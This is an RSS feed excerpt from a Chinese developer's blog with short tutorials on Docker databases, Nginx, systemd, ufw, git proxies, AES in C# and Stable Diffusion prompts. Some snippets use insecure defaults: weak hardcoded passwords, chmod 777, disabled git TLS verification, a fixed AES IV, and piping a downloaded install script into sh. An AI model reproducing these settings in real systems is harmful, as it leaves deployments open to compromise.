[Unit] Description=My .NET App [Service] WorkingDirectory=/var/www/myapp ExecStart=/var/www/myapp/MyApp Restart=always RestartSec=10 SyslogIdentifier=dotnet-myapp User=www-data Environment=ASPNETCORE_ENVIRONMENT=Production [Install] WantedBy=multi-user.target 启动服务：
sudo systemctl enable myapp.service sudo systemctl start myapp.service 确保应用程序配置了正确的端口监听和防火墙规则。
++++++++++++++++++&amp;ndash;
api wr wwwroot json
using Microsoft.AspNetCore.Mvc; using System.</description></item><item><title>Err idealTree:npm: sill idealTree</title><link>https://qfsyso.github.io/posts/err-idealtreenpm-sill-idealtree/</link><pubDate>Sun, 22 Sep 2024 01:18:16 +0000</pubDate><guid>https://qfsyso.github.io/posts/err-idealtreenpm-sill-idealtree/</guid><description>idealTree:npm: sill idealTree buildDeps Err
#清除缓存
npm cache clean --force 出现npm WARN using &amp;ndash;force I sure hope you know what you are doing.用：
npm cache verify 设置镜像源： npm config set registry https://registry.npmmirror.com 查看下是否设置成功： npm config get registry https://registry.npmmirror.com
npm install</description></item><item><title> docker oracle</title><link>https://qfsyso.github.io/posts/docker-oracle/</link><pubDate>Sat, 21 Sep 2024 01:27:39 +0000</pubDate><guid>https://qfsyso.github.io/posts/docker-oracle/</guid><description>使用Docker容器安装Oracle数据库
安装Docker sudo apt-get update sudo apt-get install docker.io 下载镜像 docker pull registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 创建文件 mkdir -p /home/data/oracle/oradata 授权，不授权会导致后面安装失败 chmod 777 /home/data/oracle/oradata docker run -d -p 1521:1521 -p 5500:5500 -e ORACLE_SID=ORCLCDB -e ORACLE_PDB=ORCLPDB -e ORACLE_PWD=123456 -e ORACLE_EDITION=standard -e ORACLE_CHARACTERSET=AL32UTF8 -v /home/data/oracle/oradata:/opt/oracle/oradata --name oracle registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 进入
docker exec -it oracle-db bash -c &amp;#34;source /home/oracle/.bashrc; sqlplus /nolog&amp;#34; SQL&amp;gt; CONNECT sys as sysdba@your_password SQL&amp;gt; ALTER USER sys IDENTIFIED BY your_password; SQL&amp;gt; CREATE USER your_username IDENTIFIED BY your_password; SQL&amp;gt; GRANT CONNECT, RESOURCE TO your_username; CREATE TABLE test_table ( id NUMBER, name VARCHAR2(50) ); INSERT INTO test_table (id, name) VALUES (1, &amp;#39;Test Name&amp;#39;); COMMIT; SELECT * FROM test_table; CONNECT / AS SYSDBA; 以 SYSDBA 角色连接到数据库。 使用 SYSDBA 角色登录，该角色具有最高级别的数据库权限，允许进行系统级别的管理任务。</description></item><item><title>node ase encrypt</title><link>https://qfsyso.github.io/posts/node-ase-encrypt/</link><pubDate>Sat, 21 Sep 2024 01:25:07 +0000</pubDate><guid>https://qfsyso.github.io/posts/node-ase-encrypt/</guid><description>// 加密方法 public static string Encrypt(string plainText, string key) { using (Aes aesAlg = Aes.Create()) { aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6];// new byte[16]; // 初始化向量 (IV) 可以设为全零，也可以使用随机值 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) { using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) { swEncrypt.</description></item><item><title>js qrcode</title><link>https://qfsyso.github.io/posts/js-qrcode/</link><pubDate>Sat, 21 Sep 2024 01:18:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/js-qrcode/</guid><description>qrcode &amp;lt;script src=&amp;#34;https://code.jquery.com/jquery-3.6.0.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;div id=&amp;#34;qrcode&amp;#34; style=&amp;#34;width: 200px; height: 200px;&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;script&amp;gt; $(document).ready(function () { var qrData = &amp;#34;https://www.qq.com?p=100&amp;#34;; $(&amp;#34;#qrcode&amp;#34;).qrcode({ width: 200, height: 200, text: qrData }); }); &amp;lt;/script&amp;gt; Node Server const http = require(&amp;#39;http&amp;#39;); const fs = require(&amp;#39;fs&amp;#39;); const path = require(&amp;#39;path&amp;#39;); const server = http.createServer((req, res) =&amp;gt; { if (req.url === &amp;#39;/&amp;#39;) { req.url = &amp;#39;/index.html&amp;#39;; } const filePath = path.join(__dirname, &amp;#39;public&amp;#39;, req.url); fs.readFile(filePath, (err, content) =&amp;gt; { if (err) { // 读取自定义的404页面 fs.</description></item><item><title>electron uniapp mp3</title><link>https://qfsyso.github.io/posts/electron-uniapp-mp3/</link><pubDate>Thu, 19 Sep 2024 23:29:51 +0000</pubDate><guid>https://qfsyso.github.io/posts/electron-uniapp-mp3/</guid><description>前言 音乐APP版权/广告问题，让听歌体验很差，所以自己整个简单的播放器~
Uniapp MP3 1. 创建项目 在 HBuilderX 中，新建一个 UniApp 项目，项目结构如下：
- pages/ - index/ - index.vue - static/ - manifest.json - pages.json 2. 页面设计和逻辑 index.vue 文件 在 pages/index/index.vue 文件中实现播放器的界面和逻辑：
&amp;lt;template&amp;gt; &amp;lt;view class=&amp;#34;container&amp;#34;&amp;gt; &amp;lt;text class=&amp;#34;title&amp;#34;&amp;gt;UniApp 音乐播放器&amp;lt;/text&amp;gt; &amp;lt;view class=&amp;#34;controls&amp;#34;&amp;gt; &amp;lt;button @click=&amp;#34;prevTrack&amp;#34;&amp;gt;上一首&amp;lt;/button&amp;gt; &amp;lt;button @click=&amp;#34;playPause&amp;#34;&amp;gt;{{ isPlaying ? &amp;#39;暂停&amp;#39; : &amp;#39;播放&amp;#39; }}&amp;lt;/button&amp;gt; &amp;lt;button @click=&amp;#34;nextTrack&amp;#34;&amp;gt;下一首&amp;lt;/button&amp;gt; &amp;lt;/view&amp;gt; &amp;lt;text&amp;gt;{{ currentTrack.name }}&amp;lt;/text&amp;gt; &amp;lt;/view&amp;gt; &amp;lt;/template&amp;gt; &amp;lt;script&amp;gt; export default { data() { return { audioContext: null, isPlaying: false, currentTrackIndex: 0, tracks: [ { name: &amp;#39;歌曲 1&amp;#39;, url: &amp;#39;https://example.</description></item><item><title>nginx load balance</title><link>https://qfsyso.github.io/posts/nginx-load-balance/</link><pubDate>Wed, 04 Sep 2024 22:20:33 +0000</pubDate><guid>https://qfsyso.github.io/posts/nginx-load-balance/</guid><description>Nginx Load Balance Proxy 反向代理、负载均衡
docker run --name nginx -p 8080:80 -d nginx 进入nginx容器
Docker exec -it nginx bash nginx.conf文件 nginx.conf分为http块、events块和server块,此次主要在server块中做更改.
/etc/nginx/nginx.conf 末尾 include /etc/nginx/conf.d/*.conf;
/etc/nginx/conf.d/default.conf
upstream ServiceInstance{ #nginx默认轮询下面的服务实例 server ***.**.***.***:9007; server ***.**.***.***:9008; server ***.**.***.***:9009; } server { ... location / { #root /usr/share/nginx/html; #index index.html index.htm; #请求到达后会进行转发 proxy_pass http://ServiceInstance; } ... } 浏览器中调用一个接口查看
访问不同的服务实例,负载均衡就实现了！
也可以设置权重比例,weight值越大,请求到达此实例的次数就越多！
upstream ServiceInstance{ #nginx默认轮询下面的服务实例 server ***.**.***.***:9007 weight=1; server ***.**.***.***:9008 weight=2; server ***.**.***.***:9009 weight=3; }</description></item><item><title> node keep backend</title><link>https://qfsyso.github.io/posts/node-keep-backend/</link><pubDate>Sat, 31 Aug 2024 01:52:41 +0000</pubDate><guid>https://qfsyso.github.io/posts/node-keep-backend/</guid><description>在 Debian 系统上运行 Node.js 应用程序并使其保持常驻运行有几种方法
方法一：使用 systemd 服务 可以创建一个 .service 文件来定义 Node.js 应用程序作为系统服务。 my-node-app
sudo nano /etc/systemd/system/my-node-app.service 编辑服务文件： 在文件中添加以下内容 ：
[Unit] Description=My Node.js Application After=network.target [Service] User=your-username WorkingDirectory=/path/to/your/app ExecStart=/usr/bin/node /path/to/your/app/index.js Restart=always Environment=NODE_ENV=production [Install] WantedBy=multi-user.target 启动并启用服务：
sudo systemctl start my-node-app sudo systemctl enable my-node-app 检查服务状态：
sudo systemctl status my-node-app 方法二：使用 nohup 和 &amp;amp; 如果不想使用 systemd，可以使用 nohup 命令来保持应用程序在后台运行。
启动应用程序：
sudo nohup node /root/nodexxx/app.js &amp;gt; outputapp3.log 2&amp;gt;&amp;amp;1 &amp;amp; 这会启动 Node.js 应用程序，并将输出和错误重定向到 app.log 文件中。</description></item><item><title> win bilud go 4 linux</title><link>https://qfsyso.github.io/posts/win-bilud-go-4-linux/</link><pubDate>Mon, 26 Aug 2024 00:58:39 +0000</pubDate><guid>https://qfsyso.github.io/posts/win-bilud-go-4-linux/</guid><description>1. 安装必要的工具和依赖 首先，确保你已经安装了Go编译器和VS Code。如果还没有安装Go，可以从官方网站下载并安装。
2. 配置Go环境 打开VS Code，按 Ctrl + Shift + P 打开命令面板，输入 &amp;ldquo;shell&amp;rdquo; 选择 &amp;ldquo;Shell: Windows&amp;rdquo; 或 &amp;ldquo;Shell: Linux&amp;rdquo;
创建一个新的Go项目 在VS Code中创建一个新的文件夹作为你的Go项目目录，然后在终端中导航到该目录并初始化一个新的Go项目：
mkdir my-go-app cd my-go-app go mod init my-go-app touch main.go 4. 编写Go程序 在 main.go 文件中编写一个简单的Hello World程序：
package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;Hello, World!&amp;#34;) } 5. 安装交叉编译工具 ⭐ Go提供了一些工具来进行跨平台编译。你可以使用以下命令来安装这些工具：
go install github.com/golang/tools/cmd/goimports@latest go install golang.org/x/lint/golint@latest go install github.com/cweill/gotests/...@latest 6. 配置VS Code以使用Linux环境 你需要一个Linux环境来进行交叉编译。Windows Subsystem for Linux (WSL)来实现。 (https://learn.</description></item><item><title>Anolis8.4 .NET</title><link>https://qfsyso.github.io/posts/anolis8.4-.net/</link><pubDate>Sun, 25 Aug 2024 10:03:23 +0000</pubDate><guid>https://qfsyso.github.io/posts/anolis8.4-.net/</guid><description>Anolis8.4 包管理器为 yum。
打开终端或命令提示符窗口，并切换到 root 用户。
添加 Microsoft 包源。
wget https://packages.microsoft.com/config/centos/8/packages-microsoft-prod.repo -O /etc/yum.repos.d/packages-microsoft-prod.repo 安装.NET 8 SDK。
sudo yum install dotnet-sdk-8.0 运行时
sudo yum install dotnet-runtime-8.0 安装完成后，可以通过以下命令验证.NET 8 是否已成功安装。
dotnet --version test
dotnet new console -o HelloWorld cd HelloWorld dotnet run</description></item><item><title>node koa</title><link>https://qfsyso.github.io/posts/node-koa/</link><pubDate>Mon, 19 Aug 2024 23:57:00 +0000</pubDate><guid>https://qfsyso.github.io/posts/node-koa/</guid><description>koa Koa 是一个由 Express 原班人马打造的新的 Web 框架，旨在提供更小、更富表现力、更健壮的服务器处理逻辑。它使用 ES6 的新特性，如 Promises 和 generators，来简化异步流程控制。以下是一些关于 Koa 的关键点：
特点 轻量级：Koa 的核心代码非常精简，没有捆绑很多中间件，这使得它的启动速度快、体积小。
简洁的中间件系统：Koa 使用基于 Promise 的中间件模型，这个模型允许你通过 async/await 来编写异步代码，并且可以方便地在中间件之间共享逻辑。
强大的上下文对象 (Context)：每个请求都有一个 context 对象，它包含了 request 和 response 的所有信息，简化了处理 HTTP 消息的流程。
**错误处理：**Koa 通过统一的错误处理机制来简化错误处理过程，你可以在任何地方抛出错误，并在应用的顶层捕获它们。
**内置支持 async/await：**由于 Koa 基于 ES6 的新特性，所有的处理函数默认都是异步的，你可以使用 async/await 来编写更简洁和直观的代码。
nvm install 7 npm i koa node my-koa-app.js const Koa = require(&amp;#39;koa&amp;#39;); const app = new Koa(); // logger app.use(async (ctx, next) =&amp;gt; { await next(); // 调用下一个中间件 const rt = ctx.</description></item><item><title>aliyun RabbitMQ</title><link>https://qfsyso.github.io/posts/aliyun-rabbitmq/</link><pubDate>Sun, 18 Aug 2024 12:48:20 +0000</pubDate><guid>https://qfsyso.github.io/posts/aliyun-rabbitmq/</guid><description>云消息队列RabbitMQ版和开源版本的区别和优势 云消息队列 RabbitMQ 版是一款基于高可用分布式存储架构实现的 AMQP 0-9-1 协议的消息产品，能够兼容开源 RabbitMQ 客户端。与开源 RabbitMQ 相比，能够解决各种稳定性痛点（例如消息堆积、脑裂等问题），同时具备高并发、分布式、灵活扩缩容等云消息服务优势。
云消息队列RabbitMQ版Serverless系列实例 云消息队列 RabbitMQ 版 Serverless 系列实例能力和预付费系列的企业版能力一样，但 Serverless 系列实例具有更高的弹性上限，且是按量后付费的计费方式，无需提前预留资源，按照实际使用量收费，降本增效。
AccessKey AccessKey 添加 Vhost 添加 Exchange 添加 Queue
Exchange绑定queue
导入项目到ideaIU amqp-java-demo &amp;gt; src &amp;gt; main &amp;gt; java，双击Config.java文件，将代码中HOSTNAME、USERNAME、PASSWORD三个参数值替换为阿里云RabbitMQ实例的公网接入点、静态用户名和静态密码。
ProducerTest.java 持续发送消息。 看到控制台 [SendResult] Message with msgId: ba42ffcb-ff05-422e-9e9f-37cdd8f2c9b0 has been ack-ed, deliveryTag: 1, multiple: false</description></item><item><title>Debian ufw</title><link>https://qfsyso.github.io/posts/debian-ufw/</link><pubDate>Sun, 18 Aug 2024 12:44:31 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-ufw/</guid><description>安装ufw sudo apt update sudo apt install ufw #开启防火墙
sudo ufw enable #关闭防火墙
ufw disable ufw status verbose ufw status numbered sudo ufw status #查看状态 sudo ufw disable #关闭 sudo ufw enble #开启 sudo ufw allow 8000/tcp #添加规则，允许所有ip访问8000端口 sudo ufw deny 8000/tcp #添加或者修改规则，禁止访问8000端口 sudo ufw delete 8000/tcp #删除该规则 恢复默认策略： ufw default deny incoming ufw default allow outgoing ufw default reject routed 重置UFW（将删除所有自定义策略并关闭UFW）
ufw reset 添加允许连接的商端口：
ufw allow [port] 放行指定范围的端口：
ufw allow 10010:10086/tcp ufw allow 10010:10086/udp 允许指定ip访问</description></item><item><title>git 443 couldt connect</title><link>https://qfsyso.github.io/posts/git-443-couldt-connect/</link><pubDate>Sun, 18 Aug 2024 11:59:27 +0000</pubDate><guid>https://qfsyso.github.io/posts/git-443-couldt-connect/</guid><description>Git Err
unable to access ‘https://github.com/…’: Failed to connect to github.com port 443 after 21096 ms: Couldn’t connect to server
err
OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443
重置git代理 检查是否开了网络代理，如果有先关闭 在命令行输入如下命令
git config --global --unset http.proxy git config --global --unset https.proxy 找到本机代理端口号
git config --global http.proxy http://127.0.0.1:端口号 git config --global https.proxy http://127.0.0.1:端口号 git config &amp;ndash;global http.sslVerify false
网络与internet -&amp;gt; 代理
手动设置代理 IP 端口 10809
git HTTP代理设置 要设置Git的HTTP代理，需要在终端中运行以下命令：
git config &amp;ndash;global http.</description></item><item><title>Docker mssql</title><link>https://qfsyso.github.io/posts/docker-mssql/</link><pubDate>Sun, 18 Aug 2024 11:08:56 +0000</pubDate><guid>https://qfsyso.github.io/posts/docker-mssql/</guid><description>创建容器 docker run -e &amp;#34;ACCEPT_EULA=Y&amp;#34; -e &amp;#34;MSSQL_SA_PASSWORD=Admin@123&amp;#34; -p 1433:1433 --name sql1 --hostname sql1 -d mcr.microsoft.com/mssql/server:2017-latest 进入 ```bash sudo docker exec -it sql1 &amp;ldquo;bash&amp;rdquo;
/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P &amp;ldquo;Admin@123&amp;rdquo;
```sql CREATE DATABASE TestDB; go SELECT Name from sys.databases; go use TestDB; go; CREATE TABLE Employees ( EmployeeID INT PRIMARY KEY, FirstName NVARCHAR(50), LastName NVARCHAR(50), BirthDate DATE, Position NVARCHAR(50) ); INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (1, &amp;#39;z&amp;#39;, &amp;#39;s&amp;#39;, &amp;#39;2000-01-01&amp;#39;, &amp;#39;Software Developer&amp;#39;); INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (2, &amp;#39;l&amp;#39;, &amp;#39;s&amp;#39;, &amp;#39;2001-01-15&amp;#39;, &amp;#39;Project Manager&amp;#39;); INSERT INTO Employees (FirstName, LastName, BirthDate, Position) VALUES ( &amp;#39;l1&amp;#39;, &amp;#39;s&amp;#39;, &amp;#39;2001-01-15&amp;#39;, &amp;#39;Project Manager&amp;#39;); SELECT * FROM Employees; py测试 pip install pyodbc import pyodbc # 配置数据库连接信息 server = &amp;#39;localhost&amp;#39; database = &amp;#39;TestDB&amp;#39; username = &amp;#39;SA&amp;#39; password = &amp;#39;Admin@123&amp;#39; driver = &amp;#39;{ODBC Driver 17 for SQL Server}&amp;#39; # 根据你的SQL Server版本选择合适的驱动 # 建立连接 connection_string = f&amp;#34;DRIVER={driver};SERVER={server};DATABASE={database};UID={username};PWD={password}&amp;#34; conn = pyodbc.</description></item><item><title>Hologres DataWorks</title><link>https://qfsyso.github.io/posts/hologres-dataworks/</link><pubDate>Thu, 15 Aug 2024 22:49:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/hologres-dataworks/</guid><description>实时数仓Hologres Hologres是阿里云自研一站式实时数仓，统一数据平台架构，支持海量结构化/半结构化数据的实时写入、实时更新、实时加工、实时分析，支持标准SQL（兼容PostgreSQL协议），无缝对接主流BI工具，支持OLAP查询、即席分析、在线服务、向量计算多个场景，分析性能打破TPC-H世界记录，与MaxCompute、Flink、DataWorks深度融合，提供离在线一体化全栈数仓解决方案。
大数据开发治理平台DataWorks DataWorks基于阿里云ODPS/EMR/CDP等大数据引擎，为数据仓库/数据湖/湖仓一体等解决方案提供统一的全链路大数据开发治理平台。作为阿里巴巴数据中台的建设者，DataWorks从2009年起不断沉淀阿里巴巴大数据建设方法论，同时与数万名政务/金融/零售/互联网/能源/制造等客户携手，助力产业数字化升级。
DataV数据可视化 数据可视化DataV是阿里云数据可视化应用搭建平台，旨让更多的人看到数据可视化的魅力，帮助非专业的工程师通过图形化的界面轻松搭建专业水准的可视化应用，满足您会议展览、业务监控、风险预警、地理信息分析等多种业务的展示需求。
Hologres 64core VS ClickHouse 64core 在单表测试的13个查询中，11个查询Hologres比Clickhouse更快。 Clickhouse总耗时是Hologres的1.35倍。
高性能实时写入与更新 通过Hologres Fixed Plan能力，实现高性能的实时写入与更新
Hologres Binlog:全链路的实时开发体验，简化数仓分层 通过Hologres Binl0g，结合Flink，可以实现全链路的实时开发体验，达到像Kafka、datahub同等的消息队列能力，简化数仓分层体验，增加数据复用能力。
Runtime Filter:自动优化大小表Join效率 计算组(warehouse)实例:资源隔离、弹性、自动切流
Serverless Computing:提供大作业隔离与弹性处理 通过共享Serverless资源执行DML任务，保证大任务隔高与高可用，降低成本并提升性能。 同时支持设置单条SOL使用 Serverless的资源上限，支持设置使用Serverless资源的SOL优先级
案例 小红书 ClickHouse Only 7天 乐元素:替换Hive+Presto构建高性能游戏运营分析平白 流量分析 开箱可用 性能比手写sql快10倍 节约成本 https://www.aliyun.com/activity/bigdata/hologres_cases
电商漏斗模型分析 漏斗模型有助于企业识别在客户购买过程中的各个环节，通过优化漏斗的各个阶段来增加转化率，提升销售业绩。本案例将分析电商场景的漏斗模型、计算各环节的转化率。
智慧城市人口财产主题分析 采集各个领域的数据进行整合和分析，使得城市管理更高效、服务更贴心。本案例以城市人口财产主题分析为背景，为您介绍DataWorks在智慧城市项目中的应用。
视频个性化推荐(协同过滤) 协同过滤算法是一种用于个性化推荐的技术，它可以基于用户间的行为相似性或物品间的相似性为用户推荐物品。本案例将为您介绍在DataWorks中如何使用阿里云PAI的协同过滤算法实现视频的个性化推荐。
实操 mysql -&amp;gt; hologres 创建专有网络VPC和交换机 192.168.0.0/16。 开通DataWorks 创建公网NAT
创建Hologres表 登录Hologres控制台。 新建库，新建表
-- 新建schema用于创建内表并导入数据 CREATE SCHEMA IF NOT EXISTS hologres_dataset_github_event; DROP TABLE IF EXISTS hologres_dataset_github_event.hologres_github_event; BEGIN; CREATE TABLE hologres_dataset_github_event.</description></item><item><title>docker postgresql</title><link>https://qfsyso.github.io/posts/docker-postgresql/</link><pubDate>Wed, 14 Aug 2024 23:02:46 +0000</pubDate><guid>https://qfsyso.github.io/posts/docker-postgresql/</guid><description>创建容器 docker run -id --name=postgresql -v postgre-data:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_PASSWORD=123456 -e LANG=C.UTF-8 postgres 进入 docker exec -it my-postgres psql -U postgres SELECT version(); create database test_db; CREATE TABLE test_table ( id SERIAL PRIMARY KEY, name VARCHAR(50) NOT NULL, age INTEGER ); INSERT INTO test_table (name, age) VALUES (&amp;#39;m&amp;#39;, 30); SELECT * FROM test_table; nodejs测试 // 引入 &amp;#39;pg&amp;#39; 模块 const { Client } = require(&amp;#39;pg&amp;#39;); // 设置数据库连接参数 const client = new Client({ user: &amp;#39;postgres&amp;#39;, host: &amp;#39;localhost&amp;#39;, database: &amp;#39;test_db&amp;#39;, password: &amp;#39;123456&amp;#39;, port: 5432, }); // 连接到数据库 client.</description></item><item><title>stable diffusion</title><link>https://qfsyso.github.io/posts/stable-diffusion/</link><pubDate>Tue, 13 Aug 2024 21:22:29 +0000</pubDate><guid>https://qfsyso.github.io/posts/stable-diffusion/</guid><description>背景知识 部署Stable Diffusion，内置模型库+常用插件+ControlNet。
这是一项接近零基础的教程，其中并不会包含复杂的概念或者深奥的算法。换句话说，只要你稍有计算机基础，了解如何敲入命令，知道怎么使用浏览器打开网页，您就能很轻松的完成这个实验。
AI生成内容的形式相当丰富，除了文字外，还可以进行绘画、作曲、演唱、编剧、设计等。最近热度非常高的Text to Image就是AI加持下非常时髦的一种图片创造方式。看看下面这些图片，你一定很难想象它们都是AI生成的吧。
许多人可能觉得，使用AIGC有很高的门槛，普通人是很难入门的。其实不然，随着AI技术的快速发展以及众多开源项目的诞生，我们每个人都可以很轻松且廉价的使用到AIGC。谁能想到，在2018 年，人工智能生成的画作在佳士得拍卖价还高达43.25万美元，而时隔才数年，让AI为我们创作绘画已经成了人人触手可及的事情。
在这些开源项目中，Stable Diffusion无疑是优秀生之一。Stable Diffusion是一种扩散模型（Diffusion Model）的变体，称为“潜在扩散模型”（Latent Diffusion Model），由CompVis、Stability AI和LAION的研究人员和工程师创建。
它使用来自LAION-5B数据库子集的图像进行训练。使用这个模型，可以生成包括人脸在内的任何图像，因为有开源的预训练模型，所以我们也可以在自己的机器上运行它。Stable Diffusion能够根据我们提供的一些提示词以及可以调整的部分参数，通过模型计算生成一张不错的图片。
函数计算FC
函数计算（Function Compute）是一个事件驱动的全托管 Serverless 计算服务，您无需管理服务器等基础设施，只需编写代码并上传，函数计算会为您准备好计算资源，并以弹性、可靠的方式运行代码。
SD1.5 动漫风格 真人风格 轻量版 TensorRT 艺术字
提示词就是生成图片的依据，既可以是描述需要生成内容的词，例如girl, sunset, forest等； 也可以是用于是描述图像属性的词，例如best quality, beautiful, masterpiece等。我们甚至可以通过提示词选择图片生成的视角、光线、画风；人物的姿势、着装、表情、背景的内容等。
建议加上画风描述词，让您的图片更加美观，如：Cyberpunk（赛博朋克），shinkai makoto（新海诚），Ghibli Studio（吉卜力），Paul Gauguin（梵高）等等
SD提示词 qwen 你是一个优秀的导演和Stable Difusion专家。接下来我们要共同完成一部电视剧的AI创作，请你根据我给你的场景，尽可能详细地描述场景的画面，并给出制作这个场累的Stable Difusion 英语提示词，所有提示词中都要加上“画面比例16:9,超写实，高质量，&amp;ldquo;的英语，场景描述不少于200字，提示词不少于30个单词。如果你明白了，请回复“明白&amp;rdquo;，然后我将开始发给你场景。场景一:一个12岁的少年百里东君在一棵桃花树上躺着闭目养神，手上拿着一个白玉酒杯，穿着浅蓝色的长袍，带一点点花纹样式，腰间佩着长剑，阳光透过树叶酒在他的脸上，远，落雪飞，桃花盛开，显示小河，远处的凉亭、茅屋、草坪。
prompt: Prompt for Stable Diffusion: &amp;ldquo;Scene ratio 16:9, hyper-realistic, high-quality. A 12-year-old boy in ancient Chinese clothing, wearing a light blue robe with intricate patterns, lying on a branch of a peach blossom tree.</description></item><item><title>debian mysql</title><link>https://qfsyso.github.io/posts/debian-mysql/</link><pubDate>Mon, 12 Aug 2024 21:47:36 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-mysql/</guid><description>1.更新软件包列表 运行 apt update 命令来完成。
sudo apt update
2. 安装MySQL APT配置工具 安装MySQL
wget https://dev.mysql.com/get/mysql-apt-config_0.8.32-1_all.deb apt install gnupg dpkg -i mysql-apt-config_0.8.32-1_all.deb apt update 3. 安装MySQL服务器 apt install mysql-server 4 . 更新软件包列表 以便APT可以识别新添加的MySQL仓库。
sudo apt update 5. 启动MySQL服务 启动MySQL服务并设置它在系统启动时自动启动。
sudo systemctl start mysql sudo systemctl enable mysql 6. 登录MySQL服务器 使用root用户登录到MySQL服务器。
mysql -u root -p 输入密码后，您将进入MySQL命令行。使用 exit 命令退出。
ALTER USER &amp;#39;myuser&amp;#39;@&amp;#39;localhost&amp;#39; IDENTIFIED BY &amp;#39;new_password&amp;#39;; 可选
7.测试 CREATE DATABASE mydatabase; Query OK, 1 row affected (0.</description></item><item><title>debian apt update</title><link>https://qfsyso.github.io/posts/debian-apt-update/</link><pubDate>Mon, 12 Aug 2024 21:41:40 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-apt-update/</guid><description>debian更换apt源 在Debian系统中更换APT源，你需要编辑/etc/apt/sources.list文件，将其中的现有源地址替换为新的源地址。以下是一个基本的步骤和示例：
打开终端。
使用文本编辑器编辑sources.list文件，例如使用nano或vim：
sudo nano /etc/apt/sources.list 或者
sudo vim /etc/apt/sources.list 注释掉或删除旧的源地址行（在行首加#可以将其注释掉）。
添加新的源地址。例如，Debian官方的非US源，可以添加以下行：
deb http://deb.debian.org/debian bullseye main contrib non-free deb-src http://deb.debian.org/debian bullseye main contrib non-free 这里的bullseye是Debian的代号，例如bookworm、buster等。
deb http://mirrors.aliyun.com/debian/ stable main contrib non-free 保存文件并退出编辑器。
更新APT源：
sudo apt update 升级已安装的包：
sudo apt upgrade 请确保你使用的源与你的Debian版本兼容。可信的源可以保证软件包的安全和可靠性。</description></item><item><title>docker ittools</title><link>https://qfsyso.github.io/posts/docker-ittools/</link><pubDate>Wed, 07 Aug 2024 22:24:52 +0000</pubDate><guid>https://qfsyso.github.io/posts/docker-ittools/</guid><description>ittools https://github.com/CorentinTh/it-tools/tree/main
pnpm https://www.pnpm.cn/installation#%E4%BD%BF%E7%94%A8-npm-%E5%AE%89%E8%A3%85
Project Setup pnpm install Compile and Hot-Reload for Development pnpm dev Type-Check, Compile and Minify for Production pnpm build Run Unit Tests with Vitest pnpm test Lint with ESLint pnpm lint Create a new tool To create a new tool, there is a script that generate the boilerplate of the new tool, simply run:
pnpm run script:create:tool my-tool-name docker run docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest</description></item><item><title>Email Server</title><link>https://qfsyso.github.io/posts/email-server/</link><pubDate>Tue, 06 Aug 2024 19:33:24 +0000</pubDate><guid>https://qfsyso.github.io/posts/email-server/</guid><description>docker docker run -d -p 25:25 -p 80:80 -p 110:110 -p 143:143 -p 443:443 -p 587:587 -p 993:993 -p 995:995 -v /etc/localtime:/etc/localtime:ro -v /data/poste/data:/data --name &amp;#34;PosteServ&amp;#34; -h &amp;#34;mx.xxxxxx.com&amp;#34; -t analogic/poste.io 解析 mx A记录 开放25 80 110 143 443 587 993 995端口
#/srv/poste/data为Poste数据存放文件夹，如用户数据库、电子邮件、日志，方便备份。
443为web控制台端口 ip端口访问 https://ip
访问 添加管理邮箱 First poste.io configuration There is no &amp;ldquo;server.ini&amp;rdquo; in your data folder, we will try create one. You can update it later in your data folder.</description></item><item><title>Debian docker mssql</title><link>https://qfsyso.github.io/posts/debian-docker-mssql/</link><pubDate>Tue, 06 Aug 2024 19:30:54 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-docker-mssql/</guid><description>docker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 查看架构
uname -m 安装 docker run -e &amp;#34;ACCEPT_EULA=Y&amp;#34; -e &amp;#34;SA_PASSWORD=Qq123123.&amp;#34; -e &amp;#34;TZ=Asia/Shanghai&amp;#34; -p 1433:1433 --name sqlserver2022 -d mcr.microsoft.com/mssql/server:2022-latest 开放端口 1433
进入容器
docker exec -it sqlserver2022 /bin/bash 使用navicat test sa Qq123123. 测试连接
SQL测试
CREATE DATABASE mydb; GO USE mydb; GO CREATE TABLE Users ( UserId INT PRIMARY KEY IDENTITY(1,1), UserName NVARCHAR(50) NOT NULL ); GO INSERT INTO Users (UserName) VALUES (&amp;#39;zs&amp;#39;); INSERT INTO Users (UserName) VALUES (&amp;#39;ls&amp;#39;); INSERT INTO Users (UserName) VALUES (&amp;#39;w5&amp;#39;); GO SELECT * FROM Users; GO BACKUP USE master; GO BACKUP DATABASE mydb TO DISK = &amp;#39;mydblog.</description></item><item><title> Linux CPU now</title><link>https://qfsyso.github.io/posts/linux-cpu-now/</link><pubDate>Mon, 05 Aug 2024 01:51:08 +0000</pubDate><guid>https://qfsyso.github.io/posts/linux-cpu-now/</guid><description>linux 查看正在 cpu占用 在Linux中，可以使用多种命令来查看哪个进程正在使用CPU资源。以下是几个常用的命令：
top - 实时显示系统中各个进程的资源占用情况，包括CPU使用率。
top htop - top的增强版，提供更直观的界面，需要单独安装。
htop ps - 显示当前运行的进程信息，结合aux选项可以查看CPU占用率。
